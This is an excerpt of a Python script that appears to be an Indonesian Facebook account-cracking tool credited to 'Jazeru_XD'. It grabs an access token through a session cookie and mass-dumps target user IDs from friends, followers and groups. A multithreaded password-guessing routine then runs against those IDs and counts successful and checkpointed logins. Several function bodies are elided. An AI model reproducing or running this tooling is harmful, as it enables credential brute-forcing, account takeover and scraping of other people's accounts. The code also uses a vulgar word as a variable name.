...
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
			{m}•{k}•{h}•{sir} Author : Jazeru_XD {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 4.1.2; SCH-L710T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} Login Berhasil _____ Jalankan Ulang Perintahnya{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s Login Gagal _____ Expired Cookies%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		print('>> Sukses Logout, Cookies Terhapus ')
		exit()
	else:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Berapa Banyak Target : '))
	except ValueError:
		print('>> Masukkan Angka 1 - 5, Jangan Masukan Huruf ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump ID ')
		exit()
	...
	for userr in uid:
		try:
			...
			print('>> Koneksi Terputus, Silahkan Sambungkan Kembali ')
			exit()
	try:
		print('')
		...
		print(f'>>{k} Pertemanan Tidak Publik Atau Private {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 4.1.2; SCH-L710T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36'
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/JAZERU-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah Folder JAZERU-DUMP Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] JAZERU-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Mengerti ? ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Benar ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Selamat Anda Berhasil ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Sayang Sekali, Coba Lagi ')
			time.sleep(3)
			exit()
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/JAZERU-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Pilih Yang Benar {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/JAZERU-DUMP/'+geh,'r').read().splitlines()
		except:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Crack Sedang Berjalan Mohon Menunggu {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Terimakasih Telah Menunggu[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Ingin Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Have A Good Day !{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Maaf Tidak Ada Aplikasi Aktif Saat Ini.")
	else:
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Maaf Tidak Ada Aplikasi Kadaluarsa Saat Ini.")
	else:
		for i in range(len(game)):
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/JAZERU-DUMP')
	except:pass
	...
	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Tolong Sampaikan Jika Terjadi Bug Atau Error\n\t{x}——> {h}Jazeru Masih Disini\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Have A Good Days !{x}')
	time.sleep(3)
	login()
